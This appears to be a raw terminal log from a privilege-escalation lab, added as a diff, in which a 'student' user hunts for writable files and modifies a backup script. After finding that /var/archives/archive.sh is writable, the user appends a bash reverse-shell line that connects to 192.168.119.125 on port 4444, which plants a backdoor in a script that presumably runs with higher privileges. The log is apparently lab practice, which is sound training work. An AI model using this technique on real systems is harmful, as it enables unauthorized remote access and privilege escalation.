@@ -1,0 +1,263 @@
+[?2004h]0;student@052593dacd54: ~[;32m┌──([1;34mstudent㉿052593dacd54[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m [7mfind / -writable -type d 2>/dev/null[27m[C[C[C[Cfind / -writable -type d 2>/dev/null
+[?2004l/var/tmp
+/run/lock
+/run/screen
+/tmp
+/dev/shm
+/dev/mqueue
+/proc/36/task/36/fd
+/proc/36/fd
+/proc/36/map_files
+/home/student
+[?2004h]0;student@052593dacd54: ~[;32m┌──([1;34mstudent㉿052593dacd54[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m [7mecho "Finding writable files/n" && find / -writable -type d 2>/dev/null[27m[C[C[C[Cecho "Finding writable files/n" && find / -writable -type d 2>/dev/null
+[?2004lFinding writable files/n
+/var/tmp
+/run/lock
+/run/screen
+/tmp
+/dev/shm
+/dev/mqueue
+/proc/42/task/42/fd
+/proc/42/fd
+/proc/42/map_files
+/home/student
+[?2004h]0;student@052593dacd54: ~[;32m┌──([1;34mstudent㉿052593dacd54[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m [7mecho "Finding writable files" && find / -writable -type f 2>/dev/null[27m[C[C[C[Cecho "Finding writable files" && find / -writable -type f 2>/dev/null
+[?2004lFinding writable files
+/var/archives/archive.sh
+/proc/keys
+/proc/kcore
+/proc/timer_list
+/proc/sched_debug
+/proc/1/task/1/attr/current
+/proc/1/task/1/attr/exec
+/proc/1/task/1/attr/fscreate
+/proc/1/task/1/attr/keycreate
+/proc/1/task/1/attr/sockcreate
+/proc/1/task/1/attr/display
+/proc/1/task/1/attr/smack/current
+/proc/1/task/1/attr/apparmor/current
+/proc/1/task/1/attr/apparmor/exec
+/proc/1/attr/current
+/proc/1/attr/exec
+/proc/1/attr/fscreate
+/proc/1/attr/keycreate
+/proc/1/attr/sockcreate
+/proc/1/attr/display
+/proc/1/attr/smack/current
+/proc/1/attr/apparmor/current
+/proc/1/attr/apparmor/exec
+/proc/1/timerslack_ns
+/proc/12/task/12/attr/current
+/proc/12/task/12/attr/exec
+/proc/12/task/12/attr/fscreate
+/proc/12/task/12/attr/keycreate
+/proc/12/task/12/attr/sockcreate
+/proc/12/task/12/attr/display
+/proc/12/task/12/attr/smack/current
+/proc/12/task/12/attr/apparmor/current
+/proc/12/task/12/attr/apparmor/exec
+/proc/12/attr/current
+/proc/12/attr/exec
+/proc/12/attr/fscreate
+/proc/12/attr/keycreate
+/proc/12/attr/sockcreate
+/proc/12/attr/display
+/proc/12/attr/smack/current
+/proc/12/attr/apparmor/current
+/proc/12/attr/apparmor/exec
+/proc/12/timerslack_ns
+/proc/14/task/14/attr/current
+/proc/14/task/14/attr/exec
+/proc/14/task/14/attr/fscreate
+/proc/14/task/14/attr/keycreate
+/proc/14/task/14/attr/sockcreate
+/proc/14/task/14/attr/display
+/proc/14/task/14/attr/smack/current
+/proc/14/task/14/attr/apparmor/current
+/proc/14/task/14/attr/apparmor/exec
+/proc/14/attr/current
+/proc/14/attr/exec
+/proc/14/attr/fscreate
+/proc/14/attr/keycreate
+/proc/14/attr/sockcreate
+/proc/14/attr/display
+/proc/14/attr/smack/current
+/proc/14/attr/apparmor/current
+/proc/14/attr/apparmor/exec
+/proc/14/timerslack_ns
+/proc/15/task/15/attr/current
+/proc/15/task/15/attr/exec
+/proc/15/task/15/attr/fscreate
+/proc/15/task/15/attr/keycreate
+/proc/15/task/15/attr/sockcreate
+/proc/15/task/15/attr/display
+/proc/15/task/15/attr/smack/current
+/proc/15/task/15/attr/apparmor/current
+/proc/15/task/15/attr/apparmor/exec
+/proc/15/attr/current
+/proc/15/attr/exec
+/proc/15/attr/fscreate
+/proc/15/attr/keycreate
+/proc/15/attr/sockcreate
+/proc/15/attr/display
+/proc/15/attr/smack/current
+/proc/15/attr/apparmor/current
+/proc/15/attr/apparmor/exec
+/proc/15/timerslack_ns
+/proc/16/task/16/attr/current
+/proc/16/task/16/attr/exec
+/proc/16/task/16/attr/fscreate
+/proc/16/task/16/attr/keycreate
+/proc/16/task/16/attr/sockcreate
+/proc/16/task/16/attr/display
+/proc/16/task/16/attr/smack/current
+/proc/16/task/16/attr/apparmor/current
+/proc/16/task/16/attr/apparmor/exec
+/proc/16/attr/current
+/proc/16/attr/exec
+/proc/16/attr/fscreate
+/proc/16/attr/keycreate
+/proc/16/attr/sockcreate
+/proc/16/attr/display
+/proc/16/attr/smack/current
+/proc/16/attr/apparmor/current
+/proc/16/attr/apparmor/exec
+/proc/16/timerslack_ns
+/proc/18/task/18/attr/current
+/proc/18/task/18/attr/exec
+/proc/18/task/18/attr/fscreate
+/proc/18/task/18/attr/keycreate
+/proc/18/task/18/attr/sockcreate
+/proc/18/task/18/attr/display
+/proc/18/task/18/attr/smack/current
+/proc/18/task/18/attr/apparmor/current
+/proc/18/task/18/attr/apparmor/exec
+/proc/18/attr/current
+/proc/18/attr/exec
+/proc/18/attr/fscreate
+/proc/18/attr/keycreate
+/proc/18/attr/sockcreate
+/proc/18/attr/display
+/proc/18/attr/smack/current
+/proc/18/attr/apparmor/current
+/proc/18/attr/apparmor/exec
+/proc/18/timerslack_ns
+/proc/19/task/19/sched
+/proc/19/task/19/comm
+/proc/19/task/19/mem
+/proc/19/task/19/clear_refs
+/proc/19/task/19/attr/current
+/proc/19/task/19/attr/exec
+/proc/19/task/19/attr/fscreate
+/proc/19/task/19/attr/keycreate
+/proc/19/task/19/attr/sockcreate
+/proc/19/task/19/attr/display
+/proc/19/task/19/attr/smack/current
+/proc/19/task/19/attr/apparmor/current
+/proc/19/task/19/attr/apparmor/exec
+/proc/19/task/19/oom_adj
+/proc/19/task/19/oom_score_adj
+/proc/19/task/19/loginuid
+/proc/19/task/19/uid_map
+/proc/19/task/19/gid_map
+/proc/19/task/19/projid_map
+/proc/19/task/19/setgroups
+/proc/19/sched
+/proc/19/autogroup
+/proc/19/timens_offsets
+/proc/19/comm
+/proc/19/mem
+/proc/19/clear_refs
+/proc/19/attr/current
+/proc/19/attr/exec
+/proc/19/attr/fscreate
+/proc/19/attr/keycreate
+/proc/19/attr/sockcreate
+/proc/19/attr/display
+/proc/19/attr/smack/current
+/proc/19/attr/apparmor/current
+/proc/19/attr/apparmor/exec
+/proc/19/oom_adj
+/proc/19/oom_score_adj
+/proc/19/loginuid
+/proc/19/coredump_filter
+/proc/19/uid_map
+/proc/19/gid_map
+/proc/19/projid_map
+/proc/19/setgroups
+/proc/19/timerslack_ns
+/proc/43/task/43/sched
+/proc/43/task/43/comm
+/proc/43/task/43/mem
+/proc/43/task/43/clear_refs
+/proc/43/task/43/attr/current
+/proc/43/task/43/attr/exec
+/proc/43/task/43/attr/fscreate
+/proc/43/task/43/attr/keycreate
+/proc/43/task/43/attr/sockcreate
+/proc/43/task/43/attr/display
+/proc/43/task/43/attr/smack/current
+/proc/43/task/43/attr/apparmor/current
+/proc/43/task/43/attr/apparmor/exec
+/proc/43/task/43/oom_adj
+/proc/43/task/43/oom_score_adj
+/proc/43/task/43/loginuid
+/proc/43/task/43/uid_map
+/proc/43/task/43/gid_map
+/proc/43/task/43/projid_map
+/proc/43/task/43/setgroups
+/proc/43/sched
+/proc/43/autogroup
+/proc/43/timens_offsets
+/proc/43/comm
+/proc/43/mem
+/proc/43/clear_refs
+/proc/43/attr/current
+/proc/43/attr/exec
+/proc/43/attr/fscreate
+/proc/43/attr/keycreate
+/proc/43/attr/sockcreate
+/proc/43/attr/display
+/proc/43/attr/smack/current
+/proc/43/attr/apparmor/current
+/proc/43/attr/apparmor/exec
+/proc/43/oom_adj
+/proc/43/oom_score_adj
+/proc/43/loginuid
+/proc/43/coredump_filter
+/proc/43/uid_map
+/proc/43/gid_map
+/proc/43/projid_map
+/proc/43/setgroups
+/proc/43/timerslack_ns
+/home/student/.bashrc.original
+/home/student/.bash_logout
+/home/student/.zshrc
+/home/student/.profile
+/home/student/.bashrc
+[?2004h]0;student@052593dacd54: ~[;32m┌──([1;34mstudent㉿052593dacd54[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m [K[;32m└─[1;34m$[0m [K[;32m└─[1;34m$[0m echo "Finding writable files" && find / -writable -type f 2>/dev/null[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kcat /var/archives/archive.sh
+[?2004l#!/bin/bash
+
+TIMESTAMP=$(date +"%T")
+echo "$TIMESTAMP running the archiver"
+#cp -rf /home/kali/ /var/backups/kali/
+cp -rf /home/student/ /var/backups/student/
+[?2004h]0;student@052593dacd54: ~[;32m┌──([1;34mstudent㉿052593dacd54[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m ^C[?2004l[?2004h[?2004l
+[?2004h]0;student@052593dacd54: ~[;32m┌──([1;34mstudent㉿052593dacd54[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m [7mecho "bash -i >& /dev/tcp/192.168.119.125/4444 0>&1" >> /var/archives/archive.sh[27m[C[C[C[Cecho "bash -i >& /dev/tcp/192.168.119.125/4444 0>&1" >> /var/archives/archive.sh
+[?2004l[?2004h]0;student@052593dacd54: ~[;32m┌──([1;34mstudent㉿052593dacd54[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m echo "bash -i >& /dev/tcp/192.168.119.125/4444 0>&1" >> /var/archives/archive.sh[C[C[C[C[52Pcat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[?2004l#!/bin/bash
+
+TIMESTAMP=$(date +"%T")
+echo "$TIMESTAMP running the archiver"
+#cp -rf /home/kali/ /var/backups/kali/
+cp -rf /home/student/ /var/backups/student/
+bash -i >& /dev/tcp/192.168.119.125/4444 0>&1
+[?2004h]0;student@052593dacd54: ~[;32m┌──([1;34mstudent㉿052593dacd54[;32m)-[[0;1m~[;32m]
+[;32m└─[1;34m$[0m 
